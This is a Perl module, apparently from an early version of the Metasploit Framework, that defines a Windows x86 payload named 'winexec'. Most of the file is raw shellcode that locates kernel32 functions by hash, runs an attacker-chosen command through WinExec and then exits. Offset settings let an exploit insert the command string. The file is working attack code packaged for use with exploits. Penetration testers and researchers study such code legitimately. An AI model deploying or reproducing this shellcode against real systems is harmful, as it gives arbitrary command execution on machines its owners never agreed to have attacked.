package Msf::Payload::win32_exec;
use strict;
use base 'Msf::PayloadComponent::Win32Payload';
sub load {
  Msf::PayloadComponent::Win32Payload->import('Msf::PayloadComponent::BindConnection');
}

my $info =
{
    'Name'         => 'winexec',
    'Version'      => '2.0',
    'Description'  => 'Execute an arbitrary command',
    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'         => [ 'x86' ],
    'Priv'         => 0,
    'OS'           => [ 'win32' ],
    'Multistage'   => 0,
    'Size'         => '',
    'UserOpts'     =>
        {
            'CMD' => [1, 'DATA', 'The command string to execute'],
        },
        
    # win32 specific code
    'Win32Payload' =>
    {
        Offsets => { 'CMD' => [150, 'n'], 'EXITFUNC' => [133, 'V'] },
        Payload =>
        "\xe8\x56\x00\x00\x00\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b\x45\x3c".
        "\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x32".
        "\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31\xc0\xac\x38\xe0\x74\x07".
        "\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c\x24\x14\x75\xe1\x8b\x5a\x24".
        "\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8".
        "\xeb\x02\x31\xc0\x5f\x5e\x5d\x5b\xc2\x08\x00\x5e\x6a\x30\x59\x64".
        "\x8b\x19\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x5b\x08\x53\x68\x8e".
        "\x4e\x0e\xec\xff\xd6\x89\xc7\xeb\x16\x53\x68\x98\xfe\x8a\x0e\xff".
        "\xd6\xff\xd0\x53\x68\x7e\xd8\xe2\x73\xff\xd6\x6a\x00\xff\xd0\x6a".
        "\x00\xe8\xe3\xff\xff\xff", 
    }
};

sub new {
    load();
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info}, @_);
    return($self);
}